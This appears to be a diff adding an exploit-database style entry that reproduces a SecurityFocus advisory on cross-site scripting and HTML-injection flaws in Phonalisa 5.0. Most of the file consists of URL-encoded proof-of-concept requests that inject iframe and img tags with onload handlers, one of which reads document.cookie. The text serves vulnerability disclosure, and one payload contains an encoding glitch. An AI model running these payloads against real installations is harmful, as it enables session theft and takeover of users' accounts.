@@ -1,0 +1,20 @@
+source: http://www.securityfocus.com/bid/54401/info
+
+Phonalisa is prone to multiple HTML-injection, cross-site-scripting, and arbitrary code-execution vulnerabilities because the application fails to sufficiently sanitize user-supplied data.
+
+Attackers can exploit these issues to execute arbitrary code in the context of the web server, compromise the affected application, or steal cookie-based authentication credentials from legitimate users of the site. Other attacks are also possible.
+
+Phonalisa 5.0 is vulnerable; other versions may also be affected. 
+
+http://www.example.com/?s=monitorqueues&sudo=su%22%3E%3Ciframe%20src=a%20onload=alert%28document.cookie%29%20%3C [XSS]
+
+http://www.example.com/?s=monitorqueues&sudo=su%22%3E%3Ciframe%20src=a%20onload=alert%28%22VL%22%29%20%3C [XSS]
+
+http://www.example.com/?s=home&m=home&sudo=%22%3E%3Cimg%20src=http://www.vuln-lab.com/images/200911/11/i8du12ievi9fh1a9rm-owned-headonfire.jpg%20onload=alert%28123%29;%20/%3E&setlang=en-us [XSS]
+
+http://www.example.com/?s=home&m=home&sudo=%22%3E%3Cimg%20src=http://www.vuln-lab.com/images/200911/11/i8du12ievi9fh1a9rm-owned-headonfire.jpg%20/%3E&setlang=en-us [XSS]
+
+http://www.example.com/?s=provphones&m=phones&sudo=su&mac=%22%3E%3Ciframe%20src=a%20onload=alert%28%22VL
+%22%29%20%3C&ip=127.0.0.1&pbx_id=%22%3E%3Ciframe%20src=a%20onload=alert%28%22VL%22%29%20%3C&phone_type=%22%3E%3Ciframe%20src=a%20onload=alert%28%22VL%22%29%20%3C [XSS]
+
+http://www.example.com/&mac=%22%3E%3Ciframe%20src=a%20onload=alert%28%22VL%22%29%20%3C&sudo=suÂ§ion=%2Fprov%2Fcisco [XSS] 
